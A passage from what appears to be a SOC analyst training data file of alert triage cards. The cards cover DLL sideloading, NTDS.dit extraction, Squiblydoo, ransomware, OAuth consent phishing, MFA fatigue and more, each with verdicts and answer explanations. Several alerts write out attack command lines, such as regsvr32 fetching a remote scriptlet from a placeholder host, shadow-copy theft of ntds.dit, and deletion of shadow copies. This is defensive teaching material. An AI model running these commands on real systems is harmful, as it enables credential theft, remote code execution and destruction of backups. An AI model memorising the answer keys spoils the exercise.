        "related": "Query: {wks}, ±15 min\n→ A signed Microsoft binary was copied to a Temp folder alongside an UNSIGNED version.dll\n→ On launch it loaded the local unsigned version.dll (search-order hijack) → spawned powershell to {ext_ip}\n→ Legit OneDrive lives in Program Files/AppData\\Local\\Microsoft\\OneDrive, never in Temp with a local version.dll",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Opened 'Photos.zip' from email; it extracted this folder to Temp.",
        "reputation": "version.dll → VT 25/94, loader. The signed exe is a real Microsoft binary used as a clean launcher (proxy execution).",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Signed process loading an UNSIGNED DLL from the same odd directory, whether the real product ever runs from Temp, the sideloaded DLL's reputation, what the process did after.",
    "explanation": "A legitimate signed executable relocated to Temp next to an unsigned version.dll it then loads is DLL side-loading — the attacker rides a trusted binary to execute their loader and evade signature checks. The signature on the .exe is a decoy; the unsigned DLL in the wrong place is the payload. Escalate for isolation.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Vulnerable driver load (BYOVD)", "Phishing payload execution", "Persistence via registry run key"],
},
{
    "id": "sysmon_vss_ntds",
    "source": "Sysmon",
    "event_type": "NTDS.dit extraction on DC",
    "mitre": "T1003.003 – NTDS",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\vssadmin.exe\n"
        "CommandLine: vssadmin create shadow /for=C:\n"
        "ParentImage: C:\\Windows\\System32\\cmd.exe\n"
        "User: {admin}\n"
        "Computer: DC-01"
    ),
    "pivots": {
        "related": "Query: DC-01, ±20 min\n→ vssadmin create shadow → copy \\\\?\\GLOBALROOT\\...\\Windows\\NTDS\\ntds.dit C:\\Temp\\n.dit → copy SYSTEM hive\n→ Then n.dit + SYSTEM staged into a .zip, outbound to {ext_ip}\n→ Session origin: RDP from {int_ip}, a {dept} workstation, off-hours",
        "asset": "DC-01 — domain controller. ntds.dit is the entire domain's password database.",
        "user": "{admin} — IT admin, but from a non-admin workstation and off-hours, no backup/maintenance change scheduled. Backups here use Veeam VSS, not manual vssadmin + copy ntds.dit.",
        "reputation": "{ext_ip} → external, {bad_country}. {int_ip} → internal {dept} workstation.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "vssadmin create shadow followed by copying ntds.dit + SYSTEM hive, on a DC, from a non-admin/off-hours session, then staged and exfiltrated.",
    "explanation": "Snapshotting the DC volume to copy ntds.dit and the SYSTEM hive is offline extraction of every domain credential — the shadow-copy trick sidesteps the file lock on the live database. Coming from a non-admin session off-hours with exfil after, this is full domain compromise. Escalate at top priority alongside the DCSync pattern; plan for a krbtgt / domain-wide reset with IR.",
    "event_type_pool": ["Credential dumping attempt", "DCSync / replication rights abuse", "Scheduled task creation — legitimate software", "Privileged logon — expected service activity"],
},
{
    "id": "sysmon_regsvr32_sct",
    "source": "Sysmon",
    "event_type": "Signed binary proxy execution (regsvr32)",
    "mitre": "T1218.010 – Regsvr32",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\regsvr32.exe\n"
        "CommandLine: regsvr32 /s /n /u /i:http://{ext_ip}/a.sct scrobj.dll\n"
        "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n"
        "User: {user}\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ WINWORD.EXE opened a macro doc from email → regsvr32 fetching a remote .sct scriptlet ('Squiblydoo')\n→ scrobj.dll executed the remote scriptlet → spawned powershell → outbound to {ext_ip}\n→ regsvr32 pulling a remote http .sct has no legitimate use",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Office spawning regsvr32 is not a normal workflow for this user.",
        "reputation": "{ext_ip} → VT 15/94, scriptlet host, {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "regsvr32 with /i:http fetching a remote .sct (Squiblydoo), Office as the parent, scrobj.dll, the follow-on powershell + C2.",
    "explanation": "regsvr32 /i:http ... scrobj.dll fetching a remote scriptlet is the 'Squiblydoo' proxy-execution LOLBin — a signed Windows binary running attacker script from the internet, with essentially zero legitimate use. Spawned by Word from a macro doc and chaining to C2, this is a live phishing execution. Escalate for isolation.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Phishing payload execution", "Malicious script execution", "DLL search-order hijack / sideload"],
},
{
    "id": "sysmon_office_addin_fp",
    "source": "Sysmon",
    "event_type": "Office child process — signed add-in updater",
    "mitre": "T1566.001 – Spearphishing Attachment (ruled out)",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Program Files\\Common Files\\DocuSign\\DocuSignUpdater.exe\n"
        "CommandLine: DocuSignUpdater.exe /silent /check\n"
        "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n"
        "User: {user}\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: same parent-child fleet-wide, last 7 days\n→ WINWORD → DocuSignUpdater.exe appears on 300+ hosts whenever the DocuSign Word add-in loads\n→ Child binary in Program Files, signed; only outbound is to DocuSign's own update service (allowlisted)\n→ No cmd/powershell/script children, no unusual writes",
        "asset": "{wks} — standard workstation, {dept}. DocuSign add-in is approved, deployed via Intune.",
        "user": "{user} — {dept}, uses the DocuSign Word add-in for contracts. Expected behavior.",
        "reputation": "DocuSignUpdater.exe → signed by DocuSign Inc, hash matches release. Update endpoint on the approved allowlist.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Is the child a signed vendor binary in Program Files, does it appear fleet-wide with the add-in, does it spawn script interpreters or only phone home to the vendor, approved add-in.",
    "explanation": "'Office spawned a child process' is only alarming by its child — here it is a signed DocuSign add-in updater in Program Files, fleet-wide, talking only to the vendor. Close; whitelist the signed parent-child pair. The malicious Office-child cards (certutil, regsvr32 scriptlet) differ on exactly this: the child is a LOLBin fetching remote code, not a signed vendor updater.",
    "event_type_pool": ["Phishing payload execution", "Signed binary proxy execution (regsvr32)", "Living-off-the-land binary abuse", "Scheduled task creation — legitimate software"],
},

# ===================== DEFENDER (expansion) =====================
{
    "id": "def_asr_block_benign",
    "source": "Microsoft Defender",
    "event_type": "ASR rule blocked payload — pre-execution",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender Alert\n"
        "ASR Rule: Block Office applications from creating child processes (BLOCKED)\n"
        "Process: WINWORD.EXE attempted to launch cmd.exe\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ WINWORD opened a macro doc → tried to spawn cmd.exe → ASR BLOCKED it before any child ran\n→ No cmd/powershell process-create succeeded, no network connections, no files dropped\n→ Defender scan afterward: clean",
        "asset": "{wks} — standard workstation, {dept}. ASR rules in BLOCK (enforce) mode.",
        "user": "{user} — {dept}. Opened a phishing attachment; the macro tried to run but was stopped at the child-process step.",
        "reputation": "Sender domain → phishing campaign. But the payload never executed on this host.",
    },
    "verdict": "benign",
    "action": "close",
    "required_pivots": ["related"],
    "what_to_check": "Was the ASR rule in BLOCK vs AUDIT mode, did any child process actually start, any network/file/persistence artifacts after the block.",
    "explanation": "The attachment was malicious, but ASR blocked the Office-child spawn before anything executed — a true positive that the control fully contained, so it is benign (remediated), not an escalation. Close, report the phish for mail tuning. The critical discriminator is BLOCK vs AUDIT: the paired card is the same alert with ASR in audit mode, where the child actually ran.",
    "event_type_pool": ["Malware executed before detection", "Phishing payload execution", "Malware blocked — remediated", "ASR rule in audit — payload executed"],
},
{
    "id": "def_asr_audit_ran",
    "source": "Microsoft Defender",
    "event_type": "ASR rule in audit — payload executed",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender Alert\n"
        "ASR Rule: Block Office applications from creating child processes (AUDIT — would block)\n"
        "Process: EXCEL.EXE launched powershell.exe\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ ASR was AUDIT-only, so the event was logged but NOT prevented\n→ EXCEL → powershell -enc actually RAN → downloaded from {ext_ip} → scheduled task created\n→ Outbound 443 to {ext_ip} still established",
        "asset": "{wks} — standard workstation, {dept}. ASR misconfigured to AUDIT, not BLOCK (config gap).",
        "user": "{user} — {dept}. Opened a macro attachment; the child process was allowed to execute.",
        "reputation": "{ext_ip} → VT 20/94, malware distribution. Downloaded payload + persistence present.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "AUDIT vs BLOCK mode (audit does NOT prevent), did the child process and its downloads actually execute, resulting persistence and C2.",
    "explanation": "An ASR alert in AUDIT mode is a warning that the rule WOULD have blocked something it did not — here the Excel→PowerShell chain executed, pulled a payload, and installed persistence. Same rule name as the benign block card, opposite outcome, because the mode was audit. Escalate for isolation; also flag the ASR-in-audit config gap so it gets moved to block.",
    "event_type_pool": ["ASR rule blocked payload — pre-execution", "Malware blocked — remediated", "Phishing payload execution", "Malware executed before detection"],
},
{
    "id": "def_edr_ransomware",
    "source": "Microsoft Defender",
    "event_type": "Ransomware behavior — encryption in progress",
    "mitre": "T1486 – Data Encrypted for Impact",
    "alert": (
        "Microsoft Defender for Endpoint Alert (High)\n"
        "Detection: Ransomware behavior detected\n"
        "Process: C:\\Users\\{user}\\AppData\\Local\\Temp\\svchost32.exe\n"
        "Device: {wks}\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, live, last 10 min\n→ svchost32.exe renaming files at high rate to .locked, ~9,000 files so far\n→ vssadmin delete shadows /all executed (destroying local backups)\n→ Reaching out to mapped drives on {srv}; ransom note 'READ_ME.txt' written to each folder\n→ Encryption ONGOING right now",
        "asset": "{wks} — {dept} workstation with mapped drives to {srv} (shared file server). Spread risk HIGH.",
        "user": "{user} — {dept}. Ran a fake invoice earlier today.",
        "reputation": "svchost32.exe (note the '32' — not the real svchost) → VT 58/94, ransomware family.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "asset"],
    "what_to_check": "Active high-rate file renames to a new extension, shadow-copy deletion, ransom notes, whether it is reaching mapped drives / spreading — and speed, because this is live.",
    "explanation": "High-rate renames to .locked, shadow-copy deletion, ransom notes, and reach into mapped drives is ransomware detonating RIGHT NOW — every second is more files and possible spread to {srv}. Escalate immediately and push for network isolation of {wks}; this is the highest-urgency card in the set. There is no 'watch and confirm' on active encryption.",
    "event_type_pool": ["Malware executed before detection", "Mass file deletion / possible ransomware staging", "Malware blocked — remediated", "Persistence via registry run key"],
},
{
    "id": "def_eicar_test",
    "source": "Microsoft Defender",
    "event_type": "EICAR test detection — security team test",
    "mitre": "T1204 – User Execution (ruled out)",
    "alert": (
        "Microsoft Defender Alert\n"
        "Threat: Virus:DOS/EICAR_Test_File\n"
        "File: C:\\Temp\\eicar.com\n"
        "Action: Quarantined\n"
        "Device: {srv}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {srv}, ±30 min\n→ eicar.com created via a scripted deployment from the security team's test host\n→ Change ticket CHG-3200: 'Validate Defender detection + alert pipeline on new server build'\n→ No execution attempt, no other threats, file is the standard EICAR test string (not real malware)",
        "asset": "{srv} — newly built server undergoing security-tooling validation.",
        "user": "Deployed by adm.torres (security team) as part of onboarding the host into Defender.",
        "reputation": "EICAR → the industry-standard antivirus TEST file. Harmless by design; used to confirm AV is working.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Is the 'threat' the EICAR test file, who put it there and why (security validation ticket), any real malicious behavior vs a benign test string.",
    "explanation": "EICAR is the standard harmless test file used to prove AV is alerting — here it is a security-team detection-pipeline validation with a change ticket, not an attack. Close, reference CHG-3200. Worth recognizing EICAR on sight so you do not spend the timer on it or, worse, escalate your own team's test into an incident.",
    "event_type_pool": ["Malware blocked — remediated", "Malware executed before detection", "PUA detection — authorized IT tool", "Ransomware behavior — encryption in progress"],
},
{
    "id": "def_smartscreen_block",
    "source": "Microsoft Defender",
    "event_type": "SmartScreen blocked download — not executed",
    "mitre": "T1204.002 – Malicious File",
    "alert": (
        "Microsoft Defender SmartScreen\n"
        "Blocked: setup_installer.exe (unrecognized app, low reputation)\n"
        "User action: dismissed / did not run\n"
        "Device: {wks}\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±30 min\n→ SmartScreen warned on a low-reputation download; the file was NOT run (no process-create)\n→ File remained in Downloads, then deleted by the user\n→ No network connections from it, no child processes, no persistence",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Tried to download a 'free PDF converter', got the SmartScreen warning, backed out.",
        "reputation": "setup_installer.exe → low prevalence, VT 8/94 (bundled adware/PUP). Never executed on this host.",
    },
    "verdict": "benign",
    "action": "close",
    "required_pivots": ["related"],
    "what_to_check": "Did the user proceed past SmartScreen and RUN it, any process/network/persistence after, or was it dismissed and deleted.",
    "explanation": "SmartScreen warned on a low-reputation download and the user did not run it — the control worked and nothing executed, so this is benign (no impact), a quick close with a light user-awareness note. If the pivot had shown the user clicking through and the exe running, this would flip to an execution investigation; the whole verdict rides on 'did it actually run.'",
    "event_type_pool": ["Malware executed before detection", "Malware blocked — remediated", "PUA detection — authorized IT tool", "Phishing payload execution"],
},

# ===================== SENTINEL / ENTRA (expansion) =====================
{
    "id": "sent_oauth_consent_mal",
    "source": "Microsoft Sentinel",
    "event_type": "Illicit OAuth consent grant",
    "mitre": "T1528 – Steal Application Access Token",
    "alert": (
        "Sentinel Incident: Suspicious OAuth application consent\n"
        "User: {user}@corp.example.com\n"
        "App: 'PDF Merge Pro' (unverified publisher)\n"
        "Scopes: Mail.Read, Mail.Send, offline_access, Files.Read.All\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: AuditLogs + mailbox for {user}, 24h\n→ Consent came right after {user} clicked a link in a phishing mail ('Review shared document')\n→ App is newly registered, unverified publisher, tenant-external\n→ Within minutes the app's token read the mailbox and created an inbox rule forwarding finance mail externally\n→ Same app consented by 2 other users this hour",
        "asset": "Exchange Online mailbox + OneDrive (Files.Read.All grants file access too).",
        "user": "{user} — {dept}. No business need for a third-party mail-merge app with Mail.Send + offline_access.",
        "reputation": "'PDF Merge Pro' → unverified publisher, not on the tenant app allowlist, reported in other tenants as a consent-phishing app.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Publisher verified vs not, scopes requested (Mail.Read/Send + offline_access = persistent mail access), was consent phished, what the app token did, how many users consented.",
    "explanation": "Consent-phishing: the user was tricked into granting a rogue app persistent mailbox/file access via OAuth, which bypasses password + MFA entirely because it is a delegated token. The app already read mail and set an exfil forwarding rule, and it hit multiple users. Escalate: revoke the app's consent/tokens tenant-wide, remove the inbox rules, and scope every consenting user. Password resets alone do NOT revoke an OAuth grant.",
    "event_type_pool": ["OAuth app consent — approved integration", "Session token theft / replay", "Impossible travel — compromised credentials", "MFA fatigue / push bombing"],
},
{
    "id": "sent_oauth_consent_legit",
    "source": "Microsoft Sentinel",
    "event_type": "OAuth app consent — approved integration",
    "mitre": "T1528 – Steal Application Access Token (ruled out)",
    "alert": (
        "Sentinel Incident: OAuth application consent\n"
        "Admin: {admin}@corp.example.com\n"
        "App: 'Zoom for Outlook' (verified publisher, admin consent, tenant-wide)\n"
        "Scopes: Calendars.ReadWrite, User.Read\n"
        "Severity: Low"
    ),
    "pivots": {
        "related": "Query: AuditLogs, 24h\n→ Admin (not end-user) granted TENANT-WIDE consent from the Entra admin center on the IT admin subnet\n→ App publisher is Microsoft-verified; scopes limited to calendar + basic profile\n→ Matches a rollout ticket; no mailbox rules, no token misuse afterward",
        "asset": "Calendar access for the approved Zoom-Outlook integration.",
        "user": "{admin} — IT admin. Change ticket CHG-3050: 'Deploy approved Zoom Outlook add-in tenant-wide' — APPROVED.",
        "reputation": "'Zoom for Outlook' → verified publisher, well-known ISV, on the tenant app allowlist. Minimal scopes.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Admin consent vs user consent, publisher verified, scope sensitivity (calendar/profile vs mail-send/offline), matching rollout ticket, any post-consent token misuse.",
    "explanation": "A verified-publisher app with minimal scopes granted tenant-wide by an admin under an approved change is normal SaaS integration. Close, reference CHG-3050. The malicious consent card differs on the discriminators: unverified publisher, mail-send + offline_access scopes, end-user (phished) consent, and immediate token abuse — none of which are present here.",
    "event_type_pool": ["Illicit OAuth consent grant", "Session token theft / replay", "Privileged role assignment — out of process", "Conditional Access policy disabled"],
},
{
    "id": "sent_mfa_fatigue",
    "source": "Microsoft Sentinel",
    "event_type": "MFA fatigue / push bombing",
    "mitre": "T1621 – Multi-Factor Authentication Request Generation",
    "alert": (
        "Sentinel Incident: Repeated MFA requests followed by approval\n"
        "User: {user}@corp.example.com\n"
        "Detail: 22 MFA push notifications in 12 min, then one Approved\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: SigninLogs + AuthN for {user}, 24h\n→ 22 push prompts from sign-in attempts at {ext_ip} (correct password already known → credential leaked)\n→ 22nd prompt Approved (user gave in) → session established from {ext_ip}\n→ Post-login: registered a NEW authenticator device (attacker persistence) and enumerated Teams/SharePoint",
        "asset": "Entra ID identity + M365 access.",
        "user": "{user} — {dept}. Physically in office (badge log) during the prompts; reported 'phone kept buzzing' to a colleague. Did not initiate any sign-in.",
        "reputation": "{ext_ip} → hosting provider, {bad_country}, not a known corporate egress. The attacker already had the password (prompts fired without a password failure).",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Burst of MFA prompts the user did not initiate, an eventual approval, whether the attacker already had valid credentials, post-login persistence (new MFA method registered).",
    "explanation": "A flood of push prompts ending in one approval is MFA fatigue — the attacker has the password and spams pushes until the user taps Approve, then registers their own MFA method to stay in. The user's 'phone kept buzzing' while badged in-office confirms they did not initiate it. Escalate: revoke sessions, reset the password, remove the attacker's registered authenticator, and review what the session touched.",
    "event_type_pool": ["Impossible travel — compromised credentials", "Session token theft / replay", "Password spray / distributed lockout", "Illicit OAuth consent grant"],
},
{
    "id": "sent_ca_policy_disabled",
    "source": "Microsoft Sentinel",
    "event_type": "Conditional Access policy disabled",
    "mitre": "T1556.009 – Modify Authentication Process",
    "alert": (
        "Sentinel Incident: Conditional Access policy disabled\n"
        "Policy: 'Require MFA for all users'\n"
        "Changed By: {admin}@corp.example.com\n"
        "Time: {hh_off} PT\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AuditLogs for {admin}, ±60 min\n→ {admin} session token replayed from {ext_ip} (different OS fingerprint) 25 min earlier — likely compromised admin\n→ 'Require MFA' policy set to Disabled → immediately followed by legacy-auth sign-ins that no longer hit MFA\n→ No change ticket for a CA modification",
        "asset": "Tenant-wide Conditional Access — the control enforcing MFA for everyone.",
        "user": "{admin} — IT admin. Change calendar: no approved CA change. Disabling org-wide MFA is never an ad-hoc off-hours action.",
        "reputation": "{ext_ip} → external, {bad_country}, associated with the earlier token replay against this same admin.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Which policy (org-wide MFA is crown-jewel), who changed it and whether that admin session is itself suspicious, change ticket, what sign-ins the change enabled.",
    "explanation": "Disabling the tenant-wide 'Require MFA' policy off-hours, from an admin whose session was already replayed from a foreign IP, is an attacker weakening auth to widen access — and legacy-auth logins immediately followed. Escalate at high priority: re-enable the policy, revoke the admin's sessions, and treat the admin account as compromised. Tenant-level security-control changes with no ticket are incidents by default.",
    "event_type_pool": ["OAuth app consent — approved integration", "Privileged role assignment — out of process", "Session token theft / replay", "Impossible travel — VPN artifact"],
},
{
    "id": "sent_pim_role_add",
    "source": "Microsoft Sentinel",
    "event_type": "Privileged role assignment — out of process",
    "mitre": "T1098.003 – Additional Cloud Roles",
    "alert": (
        "Sentinel Incident: Privileged role assigned\n"
        "Role: Global Administrator\n"
        "Assigned To: {user}@corp.example.com\n"
        "Assigned By: {admin}@corp.example.com\n"
        "Method: direct assignment (permanent, not via PIM)\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: AuditLogs, ±60 min\n→ {admin} directly assigned Global Admin to {user} — bypassing PIM, which is mandatory here for all privileged roles\n→ {user} is a standard {dept} account, not IT\n→ Assigning admin session originates from {int_ip} ({dept} workstation), off-hours; new GA account then created an app registration with a client secret",
        "asset": "Entra ID Global Administrator — top tenant privilege.",
        "user": "{user} — {dept}, standard user, no IT role. {admin} normally works only through PIM just-in-time activation; a permanent direct GA grant is off-process.",
        "reputation": "{int_ip} — internal {dept} workstation, not an admin host. The follow-on app registration + secret is a persistence pattern.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Which role (Global Admin), assigned via approved PIM vs direct/permanent, is the recipient someone who should hold it, session origin, follow-on persistence (app registration + secret).",
    "explanation": "A permanent Global Admin grant to a standard user, bypassing mandatory PIM, off-hours, followed by an app registration with a client secret, is an attacker cementing tenant control and building a backdoor identity. Escalate: remove the role, revoke the app credential, and treat the assigning admin as compromised. Direct GA assignments outside PIM are high-severity by default in a PIM-governed tenant.",
    "event_type_pool": ["Privileged group modification — unauthorized", "Conditional Access policy disabled", "Illicit OAuth consent grant", "Group membership change — onboarding"],
},
{
    "id": "sent_guest_mass_share",
    "source": "Microsoft Sentinel",
    "event_type": "Mass external sharing / data exfiltration",
    "mitre": "T1567.002 – Exfiltration to Cloud Storage",
    "alert": (
        "Sentinel Incident: Anomalous external sharing\n"
        "User: {user}@corp.example.com\n"
        "Activity: 180 files in 'Finance-Confidential' shared via anonymous links in 20 min\n"
        "Severity: High"
    ),
    "pivots": {
        "related": "Query: {user} SharePoint audit + sign-in, 24h\n→ Session origin {ext_ip} (not the user's usual location); token looks replayed\n→ 180 anonymous 'anyone with the link' shares created for confidential finance docs → links accessed from external IPs minutes later\n→ Also added an external guest and forwarded the link list to a personal gmail",
        "asset": "SharePoint 'Finance-Confidential' — sensitive financial data. Anonymous-link sharing is normally restricted.",
        "user": "{user} — {dept}. Does not normally share externally, and never in bulk. No project requiring mass external distribution.",
        "reputation": "{ext_ip} → external, {bad_country}. Anonymous links + external guest + personal-mail forward = exfil pattern.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Volume + sensitivity of what was shared, anonymous vs named sharing, session origin, whether links were accessed externally, any personal-mail forwarding.",
    "explanation": "Bulk anonymous sharing of confidential finance files from an unusual session, with external access and a personal-mail forward, is data exfiltration through the sharing feature — likely on the back of a compromised session. Escalate: revoke the user's sessions, kill the anonymous links, remove the external guest, and involve DLP/IR on what left. The discriminators vs the benign mass-file card are sensitivity, anonymous external reach, and abnormal session origin.",
    "event_type_pool": ["Mass file deletion / possible ransomware staging", "Illicit OAuth consent grant", "Session token theft / replay", "Impossible travel — VPN artifact"],
},
{
    "id": "sent_password_spray_aad",
    "source": "Microsoft Sentinel",
    "event_type": "Cloud password spray",
    "mitre": "T1110.003 – Password Spraying",
    "alert": (
        "Sentinel Incident: Distributed sign-in failures\n"
        "Detail: 900+ failed Entra sign-ins across 210 accounts in 30 min\n"
        "Common factor: legacy auth (IMAP/SMTP) endpoints\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: SigninLogs, last 1h\n→ 210 accounts, 1–3 attempts each (spray), errors 50126/50053 across a /24 of source IPs\n→ Concentrated on legacy-auth endpoints (which bypass MFA)\n→ 2 accounts SUCCEEDED via legacy auth (no MFA) → one already created an inbox forwarding rule",
        "asset": "Entra ID tenant. Legacy authentication still enabled for a subset of mailboxes.",
        "user": "Targeted accounts span many departments — enumeration breadth, not a single user.",
        "reputation": "Source /24 → hosting/VPN ranges across {bad_country}, multiple tenant-abuse reports.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Breadth (many accounts, few attempts each = spray), legacy-auth targeting (MFA bypass), any SUCCESSES, source reputation, follow-on mailbox rules.",
    "explanation": "A distributed spray against legacy-auth endpoints that already landed two successful logins (legacy auth skips MFA) and produced an exfil forwarding rule is an active cloud identity attack, not just failed-login noise. Escalate: reset the compromised accounts, remove the rules, block the source ranges, and push to disable legacy auth tenant-wide. The successes are what turn this from 'noise' into an incident.",
    "event_type_pool": ["Password spray / distributed lockout", "Brute force / password guessing", "MFA fatigue / push bombing", "Impossible travel — compromised credentials"],
},
{
    "id": "sent_sp_signin_fp",
    "source": "Microsoft Sentinel",
    "event_type": "Service principal sign-in — documented automation",
    "mitre": "T1078.004 – Valid Accounts: Cloud (ruled out)",
    "alert": (
        "Sentinel Incident: Unfamiliar sign-in properties (service principal)\n"
        "Principal: sp-backup-automation\n"
        "Sign-in from: Azure datacenter IP ({ok_country})\n"
        "Severity: Medium"
    ),
    "pivots": {
        "related": "Query: sp-backup-automation sign-ins, 30 days\n→ Runs on a fixed schedule from Azure datacenter ranges (the automation account's region)\n→ Same app ID, same Graph/Storage scopes every run; today matched the baseline exactly\n→ 'Unfamiliar' flagged only because the datacenter IP differs from interactive user geography",
        "asset": "Automation service principal for backup jobs. Scopes limited to its storage/Graph tasks.",
        "user": "sp-backup-automation — documented app registration owned by IT Operations; runs the nightly backup runbook.",
        "reputation": "Source IP → Microsoft Azure datacenter range in {ok_country}, matches the automation account's hosting region. On the documented allowlist.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Is the principal a documented service principal, does the source resolve to the expected Azure/automation range, do scopes + schedule match the 30-day baseline, any deviation.",
    "explanation": "A service principal signing in from an Azure datacenter range is expected for cloud automation — 'unfamiliar sign-in properties' fires because the analytic compares against human geography, not because anything is wrong. Baseline, scopes, and schedule all match. Close; suppress the automation account's known ranges in the rule. The malicious identity cards differ by unusual origin, MFA/legacy anomalies, and post-login actions — none present for a scheduled backup SP.",
    "event_type_pool": ["Impossible travel — VPN artifact", "Session token theft / replay", "Illicit OAuth consent grant", "Privileged role assignment — out of process"],
},

# ===================== WINDOWS SECURITY (batch 2) =====================
{
    "id": "win_4648_explicit_cred",
    "source": "Windows Security",
    "event_type": "Explicit-credential logon — lateral movement",
    "mitre": "T1021 – Remote Services",
    "alert": (
        "EventID: 4648 (A logon was attempted using explicit credentials)\n"
        "Subject: {user}\n"
        "Target Server: {srv}\n"
        "Account Whose Credentials Were Used: {admin}\n"
        "Process: C:\\Windows\\System32\\runas.exe\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {user} on their workstation, ±30 min\n→ runas /netonly with {admin} creds → 4648 to {srv}, then to 2 more servers in 10 min\n→ {user} is a {dept} user; {admin} is an IT admin account they should not hold\n→ followed by 5145 share access to C$ on each target",
        "asset": "{srv} — file server. Target of a credential-spraying sweep across hosts.",
        "user": "{user} — {dept}, standard user. No reason to invoke IT admin creds. No change ticket.",
        "reputation": "Origin: {user}'s own {dept} workstation, not an admin host.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Explicit-cred logon (4648) using an admin account from a non-admin user's session, fan-out to multiple servers, follow-on share access.",
    "explanation": "A standard user invoking admin credentials via runas /netonly and sweeping multiple servers is lateral movement with a stolen or borrowed admin account. Escalate: contain the origin workstation and reset the admin account. The tell is a {dept} user wielding IT-admin creds against servers with no ticket.",
    "event_type_pool": ["Explicit-credential logon — approved admin task", "Suspicious remote logon", "Remote service execution — lateral movement", "Pass-the-hash"],
},
{
    "id": "win_4648_admin_legit",
    "source": "Windows Security",
    "event_type": "Explicit-credential logon — approved admin task",
    "mitre": "T1078 – Valid Accounts (ruled out)",
    "alert": (
        "EventID: 4648 (A logon was attempted using explicit credentials)\n"
        "Subject: {admin}\n"
        "Target Server: {srv}\n"
        "Account Whose Credentials Were Used: svc.sccm\n"
        "Process: C:\\Windows\\System32\\mmc.exe\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {admin} activity, ±30 min\n→ 4648 from the IT admin PAW (10.10.5.0/24) using svc.sccm to open the SCCM console\n→ Single target, no lateral fan-out, no share sweeps\n→ Matches this admin's normal daily console workflow (90-day baseline)",
        "asset": "{srv} — SCCM management server. Routine admin console access.",
        "user": "{admin} — IT admin. Uses svc.sccm to manage SCCM daily. Session from the PAW.",
        "reputation": "Origin: IT admin subnet / privileged access workstation. Expected.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Who invoked the creds and from where (admin PAW vs user host), single target vs fan-out, does it match the admin's baseline workflow.",
    "explanation": "An IT admin using a service credential from the PAW to open a management console, against a single expected server with no lateral spread, is routine ops. Close. The malicious 4648 twin differs on origin (non-admin user host) and behaviour (multi-host sweep + share access).",
    "event_type_pool": ["Explicit-credential logon — lateral movement", "Privileged logon — expected service activity", "Suspicious remote logon", "Pass-the-hash"],
},
{
    "id": "win_4698_schtask_persist",
    "source": "Windows Security",
    "event_type": "Scheduled task persistence — malicious",
    "mitre": "T1053.005 – Scheduled Task",
    "alert": (
        "EventID: 4698 (A scheduled task was created)\n"
        "Task Name: \\Microsoft\\Windows\\UpdateOrchestrator\\SysHealth\n"
        "Author: {user}\n"
        "Action: powershell.exe -nop -w hidden -enc <base64>\n"
        "Trigger: At logon + every 30 minutes\n"
        "Computer: {wks}"
    ),
    "pivots": {
